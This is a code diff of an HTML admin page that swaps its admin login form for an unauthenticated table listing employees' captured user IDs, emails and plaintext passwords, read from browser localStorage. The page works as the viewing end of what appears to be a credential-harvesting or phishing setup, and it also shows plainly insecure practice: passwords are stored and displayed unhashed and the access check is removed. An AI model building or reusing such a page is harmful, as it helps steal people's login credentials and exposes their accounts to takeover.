@@ -5,42 +5,72 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Panel</title>
     <style>
-        /* Same styling as above */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f0f2f5;
+        }
+        .admin-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            color: #1a73e8;
+            margin-bottom: 20px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+        th {
+            background-color: #1a73e8;
+            color: white;
+        }
+        tr:nth-child(even) {
+            background-color: #f8f9fa;
+        }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <h2>Admin Login</h2>
-        <form id="adminLoginForm">
-            <label for="adminId">Admin Username</label>
-            <input type="text" id="adminId" required>
-
-            <label for="adminPassword">Admin Password</label>
-            <input type="password" id="adminPassword" required>
-
-            <button type="submit">Login</button>
-        </form>
+    <div class="admin-container">
+        <h2>Admin Panel - Employee Login Entries</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Time</th>
+                    <th>User ID/Email</th>
+                    <th>Password</th>
+                </tr>
+            </thead>
+            <tbody id="entriesTable">
+            </tbody>
+        </table>
     </div>
 
     <script>
-        document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const adminId = document.getElementById('adminId').value;
-            const adminPassword = document.getElementById('adminPassword').value;
-            const response = await fetch('/admin-login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ adminId, adminPassword })
+        function loadEntries() {
+            const entries = JSON.parse(localStorage.getItem('loginEntries') || '[]');
+            const table = document.getElementById('entriesTable');
+            table.innerHTML = '';
+            
+            entries.reverse().forEach(entry => {
+                const row = table.insertRow();
+                row.insertCell(0).textContent = entry.time;
+                row.insertCell(1).textContent = entry.userid;
+                row.insertCell(2).textContent = entry.password;
             });
+        }
 
-            const data = await response.json();
-            if (data.success) {
-                alert('Admin Login Successful');
-                // Fetch the login entries here
-            } else {
-                alert('Admin Login Failed');
-            }
-        });
+        // Load entries when page opens
+        loadEntries();
     </script>
 </body>
 </html>
